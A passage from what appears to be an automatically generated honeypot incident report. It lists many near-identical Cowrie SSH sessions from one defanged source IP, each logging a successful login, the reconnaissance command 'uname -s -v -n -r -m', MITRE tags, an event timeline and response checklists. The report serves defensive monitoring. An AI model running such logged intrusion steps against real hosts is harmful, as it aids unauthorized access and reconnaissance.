- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4aa35ec87d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:44 |
| **Last Seen** | 2026-06-25 14:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:44:55` | `cowrie.session.connect` |
| `2026-06-25 14:44:55` | `cowrie.client.version` |
| `2026-06-25 14:44:55` | `cowrie.client.kex` |
| `2026-06-25 14:44:56` | `cowrie.login.success` |
| `2026-06-25 14:44:56` | `cowrie.session.params` |
| `2026-06-25 14:44:56` | `cowrie.command.input` |
| `2026-06-25 14:44:56` | `cowrie.log.closed` |
| `2026-06-25 14:44:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e1af27f020e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:45 |
| **Last Seen** | 2026-06-25 14:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:45:47` | `cowrie.session.connect` |
| `2026-06-25 14:45:47` | `cowrie.client.version` |
| `2026-06-25 14:45:48` | `cowrie.client.kex` |
| `2026-06-25 14:45:48` | `cowrie.login.success` |
| `2026-06-25 14:45:49` | `cowrie.session.params` |
| `2026-06-25 14:45:49` | `cowrie.command.input` |
| `2026-06-25 14:45:49` | `cowrie.log.closed` |
| `2026-06-25 14:45:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e76d3788864b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:46 |
| **Last Seen** | 2026-06-25 14:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:46:39` | `cowrie.session.connect` |
| `2026-06-25 14:46:39` | `cowrie.client.version` |
| `2026-06-25 14:46:39` | `cowrie.client.kex` |
| `2026-06-25 14:46:39` | `cowrie.login.success` |
| `2026-06-25 14:46:40` | `cowrie.session.params` |
| `2026-06-25 14:46:40` | `cowrie.command.input` |
| `2026-06-25 14:46:40` | `cowrie.log.closed` |
| `2026-06-25 14:46:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-769869f9a062

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:47 |
| **Last Seen** | 2026-06-25 14:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:47:32` | `cowrie.session.connect` |
| `2026-06-25 14:47:32` | `cowrie.client.version` |
| `2026-06-25 14:47:32` | `cowrie.client.kex` |
| `2026-06-25 14:47:33` | `cowrie.login.success` |
| `2026-06-25 14:47:33` | `cowrie.session.params` |
| `2026-06-25 14:47:33` | `cowrie.command.input` |
| `2026-06-25 14:47:33` | `cowrie.log.closed` |
| `2026-06-25 14:47:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3239a0c409a6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:48 |
| **Last Seen** | 2026-06-25 14:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:48:22` | `cowrie.session.connect` |
| `2026-06-25 14:48:22` | `cowrie.client.version` |
| `2026-06-25 14:48:22` | `cowrie.client.kex` |
| `2026-06-25 14:48:23` | `cowrie.login.success` |
| `2026-06-25 14:48:23` | `cowrie.session.params` |
| `2026-06-25 14:48:23` | `cowrie.command.input` |
| `2026-06-25 14:48:23` | `cowrie.log.closed` |
| `2026-06-25 14:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef5e09a5a9a3

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:49 |
| **Last Seen** | 2026-06-25 14:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:49:16` | `cowrie.session.connect` |
| `2026-06-25 14:49:16` | `cowrie.client.version` |
| `2026-06-25 14:49:17` | `cowrie.client.kex` |
| `2026-06-25 14:49:17` | `cowrie.login.success` |
| `2026-06-25 14:49:18` | `cowrie.session.params` |
| `2026-06-25 14:49:18` | `cowrie.command.input` |
| `2026-06-25 14:49:18` | `cowrie.log.closed` |
| `2026-06-25 14:49:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d33d46c375e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:50 |
| **Last Seen** | 2026-06-25 14:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:50:09` | `cowrie.session.connect` |
| `2026-06-25 14:50:09` | `cowrie.client.version` |
| `2026-06-25 14:50:09` | `cowrie.client.kex` |
| `2026-06-25 14:50:09` | `cowrie.login.success` |
| `2026-06-25 14:50:10` | `cowrie.session.params` |
| `2026-06-25 14:50:10` | `cowrie.command.input` |
| `2026-06-25 14:50:10` | `cowrie.log.closed` |
| `2026-06-25 14:50:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0429758119b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:51 |
| **Last Seen** | 2026-06-25 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:51:00` | `cowrie.session.connect` |
| `2026-06-25 14:51:00` | `cowrie.client.version` |
| `2026-06-25 14:51:00` | `cowrie.client.kex` |
| `2026-06-25 14:51:00` | `cowrie.login.success` |
| `2026-06-25 14:51:01` | `cowrie.session.params` |
| `2026-06-25 14:51:01` | `cowrie.command.input` |
| `2026-06-25 14:51:01` | `cowrie.log.closed` |
| `2026-06-25 14:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae09797e2b08

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:51 |
| **Last Seen** | 2026-06-25 14:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:51:52` | `cowrie.session.connect` |
| `2026-06-25 14:51:52` | `cowrie.client.version` |
| `2026-06-25 14:51:52` | `cowrie.client.kex` |
| `2026-06-25 14:51:52` | `cowrie.login.success` |
| `2026-06-25 14:51:53` | `cowrie.session.params` |
| `2026-06-25 14:51:53` | `cowrie.command.input` |
| `2026-06-25 14:51:53` | `cowrie.log.closed` |
| `2026-06-25 14:51:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499ffaf2f88e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:52 |
| **Last Seen** | 2026-06-25 14:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:52:48` | `cowrie.session.connect` |
| `2026-06-25 14:52:48` | `cowrie.client.version` |
| `2026-06-25 14:52:48` | `cowrie.client.kex` |
| `2026-06-25 14:52:48` | `cowrie.login.success` |
| `2026-06-25 14:52:49` | `cowrie.session.params` |
| `2026-06-25 14:52:49` | `cowrie.command.input` |
| `2026-06-25 14:52:49` | `cowrie.log.closed` |
| `2026-06-25 14:52:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28aed3e82db2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:53 |
| **Last Seen** | 2026-06-25 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:53:46` | `cowrie.session.connect` |
| `2026-06-25 14:53:46` | `cowrie.client.version` |
| `2026-06-25 14:53:46` | `cowrie.client.kex` |
| `2026-06-25 14:53:46` | `cowrie.login.success` |
| `2026-06-25 14:53:47` | `cowrie.session.params` |
| `2026-06-25 14:53:47` | `cowrie.command.input` |
| `2026-06-25 14:53:47` | `cowrie.log.closed` |
| `2026-06-25 14:53:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7259304b197

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:54 |
| **Last Seen** | 2026-06-25 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:54:40` | `cowrie.session.connect` |
| `2026-06-25 14:54:40` | `cowrie.client.version` |
| `2026-06-25 14:54:40` | `cowrie.client.kex` |
| `2026-06-25 14:54:40` | `cowrie.login.success` |
| `2026-06-25 14:54:41` | `cowrie.session.params` |
| `2026-06-25 14:54:41` | `cowrie.command.input` |
| `2026-06-25 14:54:41` | `cowrie.log.closed` |
| `2026-06-25 14:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-952f873247f2

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:55 |
| **Last Seen** | 2026-06-25 14:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:55:32` | `cowrie.session.connect` |
| `2026-06-25 14:55:32` | `cowrie.client.version` |
| `2026-06-25 14:55:32` | `cowrie.client.kex` |
| `2026-06-25 14:55:33` | `cowrie.login.success` |
| `2026-06-25 14:55:33` | `cowrie.session.params` |
| `2026-06-25 14:55:33` | `cowrie.command.input` |
| `2026-06-25 14:55:33` | `cowrie.log.closed` |
| `2026-06-25 14:55:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d8af9ed2e0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:56 |
| **Last Seen** | 2026-06-25 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:56:30` | `cowrie.session.connect` |
| `2026-06-25 14:56:30` | `cowrie.client.version` |
| `2026-06-25 14:56:30` | `cowrie.client.kex` |
| `2026-06-25 14:56:30` | `cowrie.login.success` |
| `2026-06-25 14:56:32` | `cowrie.session.params` |
| `2026-06-25 14:56:32` | `cowrie.command.input` |
| `2026-06-25 14:56:32` | `cowrie.log.closed` |
| `2026-06-25 14:56:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-119770f4c9c1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:57 |
| **Last Seen** | 2026-06-25 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:57:26` | `cowrie.session.connect` |
| `2026-06-25 14:57:26` | `cowrie.client.version` |
| `2026-06-25 14:57:26` | `cowrie.client.kex` |
| `2026-06-25 14:57:26` | `cowrie.login.success` |
| `2026-06-25 14:57:27` | `cowrie.session.params` |
| `2026-06-25 14:57:27` | `cowrie.command.input` |
| `2026-06-25 14:57:27` | `cowrie.log.closed` |
| `2026-06-25 14:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a104206e5846

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:58 |
| **Last Seen** | 2026-06-25 14:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:58:19` | `cowrie.session.connect` |
| `2026-06-25 14:58:19` | `cowrie.client.version` |
| `2026-06-25 14:58:19` | `cowrie.client.kex` |
| `2026-06-25 14:58:19` | `cowrie.login.success` |
| `2026-06-25 14:58:20` | `cowrie.session.params` |
| `2026-06-25 14:58:20` | `cowrie.command.input` |
| `2026-06-25 14:58:20` | `cowrie.log.closed` |
| `2026-06-25 14:58:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb2061f558f0

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 14:59 |
| **Last Seen** | 2026-06-25 14:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 14:59:13` | `cowrie.session.connect` |
| `2026-06-25 14:59:13` | `cowrie.client.version` |
| `2026-06-25 14:59:13` | `cowrie.client.kex` |
| `2026-06-25 14:59:13` | `cowrie.login.success` |
| `2026-06-25 14:59:14` | `cowrie.session.params` |
| `2026-06-25 14:59:14` | `cowrie.command.input` |
| `2026-06-25 14:59:14` | `cowrie.log.closed` |
| `2026-06-25 14:59:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30974b958263

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:00 |
| **Last Seen** | 2026-06-25 15:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:00:07` | `cowrie.session.connect` |
| `2026-06-25 15:00:07` | `cowrie.client.version` |
| `2026-06-25 15:00:07` | `cowrie.client.kex` |
| `2026-06-25 15:00:07` | `cowrie.login.success` |
| `2026-06-25 15:00:08` | `cowrie.session.params` |
| `2026-06-25 15:00:08` | `cowrie.command.input` |
| `2026-06-25 15:00:08` | `cowrie.log.closed` |
| `2026-06-25 15:00:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b8d50cd5529

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:01 |
| **Last Seen** | 2026-06-25 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:01:01` | `cowrie.session.connect` |
| `2026-06-25 15:01:01` | `cowrie.client.version` |
| `2026-06-25 15:01:01` | `cowrie.client.kex` |
| `2026-06-25 15:01:01` | `cowrie.login.success` |
| `2026-06-25 15:01:02` | `cowrie.session.params` |
| `2026-06-25 15:01:02` | `cowrie.command.input` |
| `2026-06-25 15:01:02` | `cowrie.log.closed` |
| `2026-06-25 15:01:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18b7d8010d43

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:01 |
| **Last Seen** | 2026-06-25 15:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:01:55` | `cowrie.session.connect` |
| `2026-06-25 15:01:55` | `cowrie.client.version` |
| `2026-06-25 15:01:55` | `cowrie.client.kex` |
| `2026-06-25 15:01:55` | `cowrie.login.success` |
| `2026-06-25 15:01:56` | `cowrie.session.params` |
| `2026-06-25 15:01:56` | `cowrie.command.input` |
| `2026-06-25 15:01:56` | `cowrie.log.closed` |
| `2026-06-25 15:01:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68bb97f8d753

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:02 |
| **Last Seen** | 2026-06-25 15:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:02:50` | `cowrie.session.connect` |
| `2026-06-25 15:02:50` | `cowrie.client.version` |
| `2026-06-25 15:02:50` | `cowrie.client.kex` |
| `2026-06-25 15:02:51` | `cowrie.login.success` |
| `2026-06-25 15:02:51` | `cowrie.session.params` |
| `2026-06-25 15:02:51` | `cowrie.command.input` |
| `2026-06-25 15:02:51` | `cowrie.log.closed` |
| `2026-06-25 15:02:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1600ad2f7a4c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:03 |
| **Last Seen** | 2026-06-25 15:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:03:44` | `cowrie.session.connect` |
| `2026-06-25 15:03:44` | `cowrie.client.version` |
| `2026-06-25 15:03:44` | `cowrie.client.kex` |
| `2026-06-25 15:03:45` | `cowrie.login.success` |
| `2026-06-25 15:03:45` | `cowrie.session.params` |
| `2026-06-25 15:03:45` | `cowrie.command.input` |
| `2026-06-25 15:03:46` | `cowrie.log.closed` |
| `2026-06-25 15:03:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a903561251

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:04 |
| **Last Seen** | 2026-06-25 15:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:04:41` | `cowrie.session.connect` |
| `2026-06-25 15:04:41` | `cowrie.client.version` |
| `2026-06-25 15:04:42` | `cowrie.client.kex` |
| `2026-06-25 15:04:42` | `cowrie.login.success` |
| `2026-06-25 15:04:43` | `cowrie.session.params` |
| `2026-06-25 15:04:43` | `cowrie.command.input` |
| `2026-06-25 15:04:43` | `cowrie.log.closed` |
| `2026-06-25 15:04:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74e738e1641d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:05 |
| **Last Seen** | 2026-06-25 15:05 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:05:43` | `cowrie.session.connect` |
| `2026-06-25 15:05:43` | `cowrie.client.version` |
| `2026-06-25 15:05:44` | `cowrie.client.kex` |
| `2026-06-25 15:05:44` | `cowrie.login.success` |
| `2026-06-25 15:05:45` | `cowrie.session.params` |
| `2026-06-25 15:05:45` | `cowrie.command.input` |
| `2026-06-25 15:05:45` | `cowrie.log.closed` |
| `2026-06-25 15:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e54957fbfe6a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:06 |
| **Last Seen** | 2026-06-25 15:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:06:45` | `cowrie.session.connect` |
| `2026-06-25 15:06:45` | `cowrie.client.version` |
| `2026-06-25 15:06:45` | `cowrie.client.kex` |
| `2026-06-25 15:06:45` | `cowrie.login.success` |
| `2026-06-25 15:06:46` | `cowrie.session.params` |
| `2026-06-25 15:06:46` | `cowrie.command.input` |
| `2026-06-25 15:06:46` | `cowrie.log.closed` |
| `2026-06-25 15:06:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ead6c86f4df

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 15:07 |
| **Last Seen** | 2026-06-25 15:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 15:07:39` | `cowrie.session.connect` |
| `2026-06-25 15:07:39` | `cowrie.client.version` |
| `2026-06-25 15:07:39` | `cowrie.client.kex` |
| `2026-06-25 15:07:39` | `cowrie.login.success` |
| `2026-06-25 15:07:40` | `cowrie.session.params` |
